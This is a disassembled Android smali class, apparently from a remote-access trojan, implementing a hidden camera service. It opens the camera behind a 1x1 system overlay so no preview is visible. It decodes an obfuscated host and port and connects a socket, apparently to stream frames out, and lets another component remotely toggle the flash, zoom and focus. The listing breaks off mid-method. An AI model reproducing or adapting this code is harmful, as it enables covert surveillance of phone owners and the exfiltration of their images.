.class public Lcmf0/c3b5bm90zq/patch/C5;
.super Landroid/app/Service;

# interfaces
.implements Landroid/view/SurfaceHolder$Callback;


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcmf0/c3b5bm90zq/patch/C5$a;
    }
.end annotation


# static fields
.field public static a:Landroid/hardware/Camera;

.field public static d:I

.field public static e:I

.field public static f:I

.field public static g:I

.field public static h:I

.field public static i:I

.field public static j:I

.field public static k:I

.field private static m:Ljava/net/Socket;

.field private static t:Ljava/lang/Object;


# instance fields
.field public b:Z

.field public c:Z

.field l:Z

.field private n:Ljava/io/OutputStream;

.field private o:Landroid/view/WindowManager;

.field private p:Landroid/view/SurfaceView;

.field private q:Landroid/view/WindowManager$LayoutParams;

.field private r:J

.field private s:J

.field private u:J

.field private v:I

.field private w:Z

.field private x:Ljava/util/List;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List<",
            "[B>;"
        }
    .end annotation
.end field

.field private y:Ljava/util/List;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List<",
            "Ljava/lang/Long;",
            ">;"
        }
    .end annotation
.end field


# direct methods
.method static constructor <clinit>()V
    .locals 1

    new-instance v0, Ljava/lang/Object;

    invoke-direct {v0}, Ljava/lang/Object;-><init>()V

    sput-object v0, Lcmf0/c3b5bm90zq/patch/C5;->t:Ljava/lang/Object;

    return-void
.end method

.method public constructor <init>()V
    .locals 3

    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    const-wide/16 v0, 0x0

    iput-wide v0, p0, Lcmf0/c3b5bm90zq/patch/C5;->r:J

    iput-wide v0, p0, Lcmf0/c3b5bm90zq/patch/C5;->s:J

    const/4 v0, 0x0

    iput-boolean v0, p0, Lcmf0/c3b5bm90zq/patch/C5;->b:Z

    iput-boolean v0, p0, Lcmf0/c3b5bm90zq/patch/C5;->c:Z

    iput-boolean v0, p0, Lcmf0/c3b5bm90zq/patch/C5;->l:Z

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v1

    iput-wide v1, p0, Lcmf0/c3b5bm90zq/patch/C5;->u:J

    const/16 v1, 0x43

    iput v1, p0, Lcmf0/c3b5bm90zq/patch/C5;->v:I

    iput-boolean v0, p0, Lcmf0/c3b5bm90zq/patch/C5;->w:Z

    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    iput-object v0, p0, Lcmf0/c3b5bm90zq/patch/C5;->x:Ljava/util/List;

    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    iput-object v0, p0, Lcmf0/c3b5bm90zq/patch/C5;->y:Ljava/util/List;

    return-void
.end method

.method static synthetic a(Lcmf0/c3b5bm90zq/patch/C5;J)J
    .locals 0

    iput-wide p1, p0, Lcmf0/c3b5bm90zq/patch/C5;->r:J

    return-wide p1
.end method

.method static synthetic a(Lcmf0/c3b5bm90zq/patch/C5;Ljava/io/OutputStream;)Ljava/io/OutputStream;
    .locals 0

    iput-object p1, p0, Lcmf0/c3b5bm90zq/patch/C5;->n:Ljava/io/OutputStream;

    return-object p1
.end method

.method static synthetic a(Ljava/net/Socket;)Ljava/net/Socket;
    .locals 0

    sput-object p0, Lcmf0/c3b5bm90zq/patch/C5;->m:Ljava/net/Socket;

    return-object p0
.end method

.method static synthetic a(Lcmf0/c3b5bm90zq/patch/C5;)V
    .locals 0

    invoke-direct {p0}, Lcmf0/c3b5bm90zq/patch/C5;->f()V

    return-void
.end method

.method static synthetic a(Lcmf0/c3b5bm90zq/patch/C5;Z)Z
    .locals 0

    iput-boolean p1, p0, Lcmf0/c3b5bm90zq/patch/C5;->w:Z

    return p1
.end method

.method static synthetic b(Lcmf0/c3b5bm90zq/patch/C5;J)J
    .locals 0

    iput-wide p1, p0, Lcmf0/c3b5bm90zq/patch/C5;->u:J

    return-wide p1
.end method

.method static synthetic b(Lcmf0/c3b5bm90zq/patch/C5;)Ljava/io/OutputStream;
    .locals 0

    iget-object p0, p0, Lcmf0/c3b5bm90zq/patch/C5;->n:Ljava/io/OutputStream;

    return-object p0
.end method

.method static synthetic c(Lcmf0/c3b5bm90zq/patch/C5;)J
    .locals 2

    iget-wide v0, p0, Lcmf0/c3b5bm90zq/patch/C5;->s:J

    return-wide v0
.end method

.method static synthetic c(Lcmf0/c3b5bm90zq/patch/C5;J)J
    .locals 0

    iput-wide p1, p0, Lcmf0/c3b5bm90zq/patch/C5;->s:J

    return-wide p1
.end method

.method public static c()V
    .locals 4

    :try_start_0
    sget-object v0, Lcmf0/c3b5bm90zq/patch/C5;->a:Landroid/hardware/Camera;

    if-eqz v0, :cond_8

    sget-object v0, Lcmf0/c3b5bm90zq/patch/C5;->m:Ljava/net/Socket;

    if-eqz v0, :cond_8

    sget v0, Lcmf0/c3b5bm90zq/patch/C11;->x:I

    sget v1, Lcmf0/c3b5bm90zq/patch/C5;->k:I

    if-eq v0, v1, :cond_0

    sget v0, Lcmf0/c3b5bm90zq/patch/C11;->x:I

    sput v0, Lcmf0/c3b5bm90zq/patch/C5;->k:I

    :cond_0
    sget v0, Lcmf0/c3b5bm90zq/patch/C11;->t:I

    sget v1, Lcmf0/c3b5bm90zq/patch/C5;->g:I

    if-eq v0, v1, :cond_1

    sget v0, Lcmf0/c3b5bm90zq/patch/C11;->t:I

    sput v0, Lcmf0/c3b5bm90zq/patch/C5;->g:I

    :cond_1
    sget v0, Lcmf0/c3b5bm90zq/patch/C11;->w:I

    sget v1, Lcmf0/c3b5bm90zq/patch/C5;->j:I

    if-eq v0, v1, :cond_2

    sget v0, Lcmf0/c3b5bm90zq/patch/C11;->w:I

    sput v0, Lcmf0/c3b5bm90zq/patch/C5;->j:I

    sget-object v0, Lcmf0/c3b5bm90zq/patch/C5;->a:Landroid/hardware/Camera;

    invoke-virtual {v0}, Landroid/hardware/Camera;->getParameters()Landroid/hardware/Camera$Parameters;

    move-result-object v0

    invoke-virtual {v0}, Landroid/hardware/Camera$Parameters;->isZoomSupported()Z

    move-result v1

    if-eqz v1, :cond_2

    sget v1, Lcmf0/c3b5bm90zq/patch/C5;->j:I

    invoke-virtual {v0, v1}, Landroid/hardware/Camera$Parameters;->setZoom(I)V

    sget-object v1, Lcmf0/c3b5bm90zq/patch/C5;->a:Landroid/hardware/Camera;

    invoke-virtual {v1, v0}, Landroid/hardware/Camera;->setParameters(Landroid/hardware/Camera$Parameters;)V

    :cond_2
    sget v0, Lcmf0/c3b5bm90zq/patch/C11;->u:I

    sget v1, Lcmf0/c3b5bm90zq/patch/C5;->h:I

    const/4 v2, 0x1

    if-eq v0, v1, :cond_5

    sget v0, Lcmf0/c3b5bm90zq/patch/C11;->u:I

    sput v0, Lcmf0/c3b5bm90zq/patch/C5;->h:I

    sget-object v0, Lcmf0/c3b5bm90zq/patch/C5;->a:Landroid/hardware/Camera;

    invoke-virtual {v0}, Landroid/hardware/Camera;->getParameters()Landroid/hardware/Camera$Parameters;

    move-result-object v0

    invoke-virtual {v0}, Landroid/hardware/Camera$Parameters;->getSupportedFlashModes()Ljava/util/List;

    move-result-object v1

    sget-object v3, Lcmf0/c3b5bm90zq/patch/C5;->a:Landroid/hardware/Camera;

    invoke-virtual {v3}, Landroid/hardware/Camera;->getParameters()Landroid/hardware/Camera$Parameters;

    move-result-object v3

    invoke-virtual {v3}, Landroid/hardware/Camera$Parameters;->getSupportedFlashModes()Ljava/util/List;

    move-result-object v3

    if-eqz v3, :cond_5

    sget v3, Lcmf0/c3b5bm90zq/patch/C5;->h:I

    if-ne v3, v2, :cond_3

    const-string v3, "torch"

    invoke-interface {v1, v3}, Ljava/util/List;->contains(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_4

    const-string v1, "torch"

    :goto_0
    invoke-virtual {v0, v1}, Landroid/hardware/Camera$Parameters;->setFlashMode(Ljava/lang/String;)V

    goto :goto_1

    :cond_3
    sget v3, Lcmf0/c3b5bm90zq/patch/C5;->h:I

    if-nez v3, :cond_4

    const-string v3, "torch"

    invoke-interface {v1, v3}, Ljava/util/List;->contains(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_4

    const-string v1, "off"

    goto :goto_0

    :cond_4
    :goto_1
    sget-object v1, Lcmf0/c3b5bm90zq/patch/C5;->a:Landroid/hardware/Camera;

    invoke-virtual {v1, v0}, Landroid/hardware/Camera;->setParameters(Landroid/hardware/Camera$Parameters;)V

    :cond_5
    sget v0, Lcmf0/c3b5bm90zq/patch/C11;->v:I

    sget v1, Lcmf0/c3b5bm90zq/patch/C5;->i:I

    if-eq v0, v1, :cond_8

    sget v0, Lcmf0/c3b5bm90zq/patch/C11;->v:I

    sput v0, Lcmf0/c3b5bm90zq/patch/C5;->i:I

    sget-object v0, Lcmf0/c3b5bm90zq/patch/C5;->a:Landroid/hardware/Camera;

    invoke-virtual {v0}, Landroid/hardware/Camera;->getParameters()Landroid/hardware/Camera$Parameters;

    move-result-object v0

    invoke-virtual {v0}, Landroid/hardware/Camera$Parameters;->getSupportedFocusModes()Ljava/util/List;

    move-result-object v1

    sget v3, Lcmf0/c3b5bm90zq/patch/C5;->i:I

    if-ne v3, v2, :cond_6

    const-string v2, "continuous-video"

    invoke-interface {v1, v2}, Ljava/util/List;->contains(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_7

    const-string v1, "continuous-video"

    :goto_2
    invoke-virtual {v0, v1}, Landroid/hardware/Camera$Parameters;->setFocusMode(Ljava/lang/String;)V

    goto :goto_3

    :cond_6
    sget v2, Lcmf0/c3b5bm90zq/patch/C5;->i:I

    if-nez v2, :cond_7

    const-string v2, "auto"

    invoke-interface {v1, v2}, Ljava/util/List;->contains(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_7

    const-string v1, "auto"

    goto :goto_2

    :cond_7
    :goto_3
    sget-object v1, Lcmf0/c3b5bm90zq/patch/C5;->a:Landroid/hardware/Camera;

    invoke-virtual {v1, v0}, Landroid/hardware/Camera;->setParameters(Landroid/hardware/Camera$Parameters;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :cond_8
    return-void
.end method

.method static synthetic d(Lcmf0/c3b5bm90zq/patch/C5;)J
    .locals 2

    iget-wide v0, p0, Lcmf0/c3b5bm90zq/patch/C5;->r:J

    return-wide v0
.end method

.method static synthetic d()Ljava/net/Socket;
    .locals 1

    sget-object v0, Lcmf0/c3b5bm90zq/patch/C5;->m:Ljava/net/Socket;

    return-object v0
.end method

.method static synthetic e()Ljava/lang/Object;
    .locals 1

    sget-object v0, Lcmf0/c3b5bm90zq/patch/C5;->t:Ljava/lang/Object;

    return-object v0
.end method

.method static synthetic e(Lcmf0/c3b5bm90zq/patch/C5;)Ljava/util/List;
    .locals 0

    iget-object p0, p0, Lcmf0/c3b5bm90zq/patch/C5;->x:Ljava/util/List;

    return-object p0
.end method

.method static synthetic f(Lcmf0/c3b5bm90zq/patch/C5;)Ljava/util/List;
    .locals 0

    iget-object p0, p0, Lcmf0/c3b5bm90zq/patch/C5;->y:Ljava/util/List;

    return-object p0
.end method

.method private f()V
    .locals 2

    const/4 v0, 0x0

    :try_start_0
    sget-object v1, Lcmf0/c3b5bm90zq/patch/C5;->m:Ljava/net/Socket;

    if-eqz v1, :cond_0

    sget-object v1, Lcmf0/c3b5bm90zq/patch/C5;->m:Ljava/net/Socket;

    invoke-virtual {v1}, Ljava/net/Socket;->close()V

    sput-object v0, Lcmf0/c3b5bm90zq/patch/C5;->m:Ljava/net/Socket;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :cond_0
    :try_start_1
    iget-object v1, p0, Lcmf0/c3b5bm90zq/patch/C5;->n:Ljava/io/OutputStream;

    if-eqz v1, :cond_1

    iget-object v1, p0, Lcmf0/c3b5bm90zq/patch/C5;->n:Ljava/io/OutputStream;

    invoke-virtual {v1}, Ljava/io/OutputStream;->close()V

    iput-object v0, p0, Lcmf0/c3b5bm90zq/patch/C5;->n:Ljava/io/OutputStream;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :catch_1
    :cond_1
    return-void
.end method

.method static synthetic g(Lcmf0/c3b5bm90zq/patch/C5;)Z
    .locals 0

    iget-boolean p0, p0, Lcmf0/c3b5bm90zq/patch/C5;->w:Z

    return p0
.end method

.method static synthetic h(Lcmf0/c3b5bm90zq/patch/C5;)J
    .locals 2

    iget-wide v0, p0, Lcmf0/c3b5bm90zq/patch/C5;->u:J

    return-wide v0
.end method

.method static synthetic i(Lcmf0/c3b5bm90zq/patch/C5;)I
    .locals 0

    iget p0, p0, Lcmf0/c3b5bm90zq/patch/C5;->v:I

    return p0
.end method


# virtual methods
.method public a(Ljava/lang/String;)V
    .locals 2

    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcmf0/c3b5bm90zq/patch/C5$2;

    invoke-direct {v1, p0, p1}, Lcmf0/c3b5bm90zq/patch/C5$2;-><init>(Lcmf0/c3b5bm90zq/patch/C5;Ljava/lang/String;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method public a(Ljava/lang/String;I)V
    .locals 2

    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcmf0/c3b5bm90zq/patch/C5$1;

    invoke-direct {v1, p0, p1, p2}, Lcmf0/c3b5bm90zq/patch/C5$1;-><init>(Lcmf0/c3b5bm90zq/patch/C5;Ljava/lang/String;I)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method public a()Z
    .locals 6

    :try_start_0
    invoke-static {}, Landroid/hardware/Camera;->open()Landroid/hardware/Camera;

    move-result-object v0
    :try_end_0
    .catch Ljava/lang/RuntimeException; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    if-eqz v0, :cond_0

    invoke-virtual {v0}, Landroid/hardware/Camera;->release()V

    :cond_0
    const/4 v0, 0x0

    return v0

    :catchall_0
    move-exception v0

    goto :goto_0

    :catch_0
    move-exception v0

    :try_start_1
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    sget-wide v2, Lcmf0/c3b5bm90zq/patch/C11;->m:J

    const-wide/16 v4, 0x45

    invoke-static {v2, v3, v4, v5}, Lcmf0/c3b5bm90zq/patch/C11;->a(JJ)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v2, Lcmf0/c3b5bm90zq/patch/C11;->f:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/RuntimeException;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v0, Lcmf0/c3b5bm90zq/patch/C11;->f:Ljava/lang/String;

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-wide v2, Lcmf0/c3b5bm90zq/patch/C11;->m:J

    const-wide/16 v4, 0x53

    invoke-static {v2, v3, v4, v5}, Lcmf0/c3b5bm90zq/patch/C11;->a(JJ)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcmf0/c3b5bm90zq/patch/C11;->a(Ljava/lang/String;)V
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    const/4 v0, 0x1

    return v0

    :goto_0
    throw v0
.end method

.method public b()V
    .locals 3

    const/4 v0, 0x0

    iput-boolean v0, p0, Lcmf0/c3b5bm90zq/patch/C5;->w:Z

    :try_start_0
    sget-object v1, Lcmf0/c3b5bm90zq/patch/C5;->a:Landroid/hardware/Camera;

    if-eqz v1, :cond_0

    sget-object v1, Lcmf0/c3b5bm90zq/patch/C5;->a:Landroid/hardware/Camera;

    const/4 v2, 0x0

    invoke-virtual {v1, v2}, Landroid/hardware/Camera;->setPreviewCallback(Landroid/hardware/Camera$PreviewCallback;)V

    sget-object v1, Lcmf0/c3b5bm90zq/patch/C5;->a:Landroid/hardware/Camera;

    invoke-virtual {v1}, Landroid/hardware/Camera;->release()V

    sput-object v2, Lcmf0/c3b5bm90zq/patch/C5;->a:Landroid/hardware/Camera;

    :cond_0
    invoke-direct {p0}, Lcmf0/c3b5bm90zq/patch/C5;->f()V

    iget-boolean v1, p0, Lcmf0/c3b5bm90zq/patch/C5;->c:Z

    if-nez v1, :cond_1

    iget-object v1, p0, Lcmf0/c3b5bm90zq/patch/C5;->o:Landroid/view/WindowManager;

    iget-object v2, p0, Lcmf0/c3b5bm90zq/patch/C5;->p:Landroid/view/SurfaceView;

    invoke-interface {v1, v2}, Landroid/view/WindowManager;->removeView(Landroid/view/View;)V

    :cond_1
    iput-boolean v0, p0, Lcmf0/c3b5bm90zq/patch/C5;->b:Z

    iput-boolean v0, p0, Lcmf0/c3b5bm90zq/patch/C5;->c:Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-void
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 0

    const/4 p1, 0x0

    return-object p1
.end method

.method public onCreate()V
    .locals 7

    :try_start_0
    invoke-virtual {p0}, Lcmf0/c3b5bm90zq/patch/C5;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, Lcmf0/c3b5bm90zq/patch/a;->f(Landroid/content/Context;)Landroid/app/Notification;

    move-result-object v0

    if-eqz v0, :cond_0

    const/16 v1, 0x7d4

    invoke-virtual {p0, v1, v0}, Lcmf0/c3b5bm90zq/patch/C5;->startForeground(ILandroid/app/Notification;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :cond_0
    :try_start_1
    sget v0, Lcmf0/c3b5bm90zq/patch/C11;->q:I

    sput v0, Lcmf0/c3b5bm90zq/patch/C5;->d:I

    sget v0, Lcmf0/c3b5bm90zq/patch/C11;->r:I

    sput v0, Lcmf0/c3b5bm90zq/patch/C5;->e:I

    sget v0, Lcmf0/c3b5bm90zq/patch/C11;->s:I

    sput v0, Lcmf0/c3b5bm90zq/patch/C5;->f:I

    sget v0, Lcmf0/c3b5bm90zq/patch/C11;->t:I

    sput v0, Lcmf0/c3b5bm90zq/patch/C5;->g:I

    sget v0, Lcmf0/c3b5bm90zq/patch/C11;->u:I

    sput v0, Lcmf0/c3b5bm90zq/patch/C5;->h:I

    sget v0, Lcmf0/c3b5bm90zq/patch/C11;->v:I

    sput v0, Lcmf0/c3b5bm90zq/patch/C5;->i:I

    sget v0, Lcmf0/c3b5bm90zq/patch/C11;->w:I

    sput v0, Lcmf0/c3b5bm90zq/patch/C5;->j:I

    sget v0, Lcmf0/c3b5bm90zq/patch/C11;->x:I

    sput v0, Lcmf0/c3b5bm90zq/patch/C5;->k:I

    const-wide/16 v0, 0x0

    iput-wide v0, p0, Lcmf0/c3b5bm90zq/patch/C5;->r:J

    iput-wide v0, p0, Lcmf0/c3b5bm90zq/patch/C5;->s:J

    invoke-virtual {p0}, Lcmf0/c3b5bm90zq/patch/C5;->a()Z

    move-result v0

    iput-boolean v0, p0, Lcmf0/c3b5bm90zq/patch/C5;->c:Z

    iget-boolean v0, p0, Lcmf0/c3b5bm90zq/patch/C5;->c:Z

    if-nez v0, :cond_3

    const-string v0, "window"

    invoke-virtual {p0, v0}, Lcmf0/c3b5bm90zq/patch/C5;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/WindowManager;

    iput-object v0, p0, Lcmf0/c3b5bm90zq/patch/C5;->o:Landroid/view/WindowManager;

    new-instance v0, Landroid/view/SurfaceView;

    invoke-direct {v0, p0}, Landroid/view/SurfaceView;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcmf0/c3b5bm90zq/patch/C5;->p:Landroid/view/SurfaceView;

    new-instance v0, Landroid/view/WindowManager$LayoutParams;

    const/4 v2, 0x1

    const/4 v3, 0x1

    const/16 v4, 0x7d6

    const/high16 v5, 0x40000

    const/4 v6, -0x3

    move-object v1, v0

    invoke-direct/range {v1 .. v6}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    iput-object v0, p0, Lcmf0/c3b5bm90zq/patch/C5;->q:Landroid/view/WindowManager$LayoutParams;

    iget-object v0, p0, Lcmf0/c3b5bm90zq/patch/C5;->q:Landroid/view/WindowManager$LayoutParams;

    const/16 v1, 0x33

    iput v1, v0, Landroid/view/WindowManager$LayoutParams;->gravity:I

    iget-object v0, p0, Lcmf0/c3b5bm90zq/patch/C5;->o:Landroid/view/WindowManager;

    iget-object v1, p0, Lcmf0/c3b5bm90zq/patch/C5;->p:Landroid/view/SurfaceView;

    iget-object v2, p0, Lcmf0/c3b5bm90zq/patch/C5;->q:Landroid/view/WindowManager$LayoutParams;

    invoke-interface {v0, v1, v2}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    iget-object v0, p0, Lcmf0/c3b5bm90zq/patch/C5;->p:Landroid/view/SurfaceView;

    invoke-virtual {v0}, Landroid/view/SurfaceView;->getHolder()Landroid/view/SurfaceHolder;

    move-result-object v0

    invoke-interface {v0, p0}, Landroid/view/SurfaceHolder;->addCallback(Landroid/view/SurfaceHolder$Callback;)V

    sget-object v0, Lcmf0/c3b5bm90zq/patch/C11;->a:Lcmf0/c3b5bm90zq/patch/a;

    invoke-virtual {p0}, Lcmf0/c3b5bm90zq/patch/C5;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    sget-wide v2, Lcmf0/c3b5bm90zq/patch/C11;->m:J

    const-wide/16 v4, 0x57

    invoke-static {v2, v3, v4, v5}, Lcmf0/c3b5bm90zq/patch/C11;->a(JJ)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Lcmf0/c3b5bm90zq/patch/a;->a(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v1, ""

    if-ne v0, v1, :cond_1

    invoke-virtual {p0}, Lcmf0/c3b5bm90zq/patch/C5;->getResources()Landroid/content/res/Resources;

    move-result-object v0

    const v1, 0x7f0c0024

    invoke-virtual {v0, v1}, Landroid/content/res/Resources;->getString(I)Ljava/lang/String;

    move-result-object v0

    goto :goto_0

    :cond_1
    sget-object v0, Lcmf0/c3b5bm90zq/patch/C11;->a:Lcmf0/c3b5bm90zq/patch/a;

    invoke-virtual {p0}, Lcmf0/c3b5bm90zq/patch/C5;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    sget-wide v2, Lcmf0/c3b5bm90zq/patch/C11;->m:J

    invoke-static {v2, v3, v4, v5}, Lcmf0/c3b5bm90zq/patch/C11;->a(JJ)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Lcmf0/c3b5bm90zq/patch/a;->a(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    :goto_0
    sget-object v1, Lcmf0/c3b5bm90zq/patch/C11;->a:Lcmf0/c3b5bm90zq/patch/a;

    invoke-virtual {p0}, Lcmf0/c3b5bm90zq/patch/C5;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    sget-wide v3, Lcmf0/c3b5bm90zq/patch/C11;->m:J

    const-wide/16 v5, 0x58

    invoke-static {v3, v4, v5, v6}, Lcmf0/c3b5bm90zq/patch/C11;->a(JJ)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Lcmf0/c3b5bm90zq/patch/a;->a(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, ""

    if-ne v1, v2, :cond_2

    invoke-virtual {p0}, Lcmf0/c3b5bm90zq/patch/C5;->getResources()Landroid/content/res/Resources;

    move-result-object v1

    const v2, 0x7f0c0022

    invoke-virtual {v1, v2}, Landroid/content/res/Resources;->getString(I)Ljava/lang/String;

    move-result-object v1

    goto :goto_1

    :cond_2
    sget-object v1, Lcmf0/c3b5bm90zq/patch/C11;->a:Lcmf0/c3b5bm90zq/patch/a;

    invoke-virtual {p0}, Lcmf0/c3b5bm90zq/patch/C5;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    sget-wide v3, Lcmf0/c3b5bm90zq/patch/C11;->m:J

    invoke-static {v3, v4, v5, v6}, Lcmf0/c3b5bm90zq/patch/C11;->a(JJ)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Lcmf0/c3b5bm90zq/patch/a;->a(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    :goto_1
    invoke-static {v0}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Integer;->intValue()I

    move-result v0

    invoke-virtual {p0, v1, v0}, Lcmf0/c3b5bm90zq/patch/C5;->a(Ljava/lang/String;I)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :catch_1
    :cond_3
    return-void
.end method

.method public onDestroy()V
    .locals 0

    invoke-virtual {p0}, Lcmf0/c3b5bm90zq/patch/C5;->b()V

    return-void
.end method

.method public surfaceChanged(Landroid/view/SurfaceHolder;III)V
    .locals 0

    sget-object p1, Lcmf0/c3b5bm90zq/patch/C5;->a:Landroid/hardware/Camera;

    if-eqz p1, :cond_0

    sget-object p1, Lcmf0/c3b5bm90zq/patch/C5;->a:Landroid/hardware/Camera;

    new-instance p2, Lcmf0/c3b5bm90zq/patch/C5$3;

    invoke-direct {p2, p0}, Lcmf0/c3b5bm90zq/patch/C5$3;-><init>(Lcmf0/c3b5bm90zq/patch/C5;)V

    invoke-virtual {p1, p2}, Landroid/hardware/Camera;->setPreviewCallback(Landroid/hardware/Camera$PreviewCallback;)V

    :cond_0
    return-void
.end method

.method public surfaceCreated(Landroid/view/SurfaceHolder;)V
    .locals 10

    iget-boolean v0, p0, Lcmf0/c3b5bm90zq/patch/C5;->b:Z

    if-nez v0, :cond_4

    const-wide/16 v0, 0x53

    const/4 v2, 0x0

    const-wide/16 v3, 0x45

    const/4 v5, 0x1

    :try_start_0
    sget v6, Lcmf0/c3b5bm90zq/patch/C5;->d:I

    invoke-static {v6}, Landroid/hardware/Camera;->open(I)Landroid/hardware/Camera;

    move-result-object v6

    sput-object v6, Lcmf0/c3b5bm90zq/patch/C5;->a:Landroid/hardware/Camera;

    iput-boolean v5, p0, Lcmf0/c3b5bm90zq/patch/C5;->b:Z
    :try_end_0
    .catch Ljava/lang/RuntimeException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v6

    iput-boolean v2, p0, Lcmf0/c3b5bm90zq/patch/C5;->b:Z

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    sget-wide v8, Lcmf0/c3b5bm90zq/patch/C11;->m:J

    invoke-static {v8, v9, v3, v4}, Lcmf0/c3b5bm90zq/patch/C11;->a(JJ)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v8, Lcmf0/c3b5bm90zq/patch/C11;->f:Ljava/lang/String;

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/RuntimeException;->getMessage()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v7, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v6, Lcmf0/c3b5bm90zq/patch/C11;->f:Ljava/lang/String;

    invoke-virtual {v7, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-wide v8, Lcmf0/c3b5bm90zq/patch/C11;->m:J

    invoke-static {v8, v9, v0, v1}, Lcmf0/c3b5bm90zq/patch/C11;->a(JJ)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v7, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lcmf0/c3b5bm90zq/patch/C11;->a(Ljava/lang/String;)V

    :goto_0
    :try_start_1
    iget-boolean v6, p0, Lcmf0/c3b5bm90zq/patch/C5;->b:Z

    if-ne v6, v5, :cond_4

    sget-object v6, Lcmf0/c3b5bm90zq/patch/C5;->a:Landroid/hardware/Camera;

    invoke-virtual {v6}, Landroid/hardware/Camera;->getParameters()Landroid/hardware/Camera$Parameters;

    move-result-object v6

    sget-object v7, Lcmf0/c3b5bm90zq/patch/C5;->a:Landroid/hardware/Camera;

    invoke-virtual {v7}, Landroid/hardware/Camera;->getParameters()Landroid/hardware/Camera$Parameters;

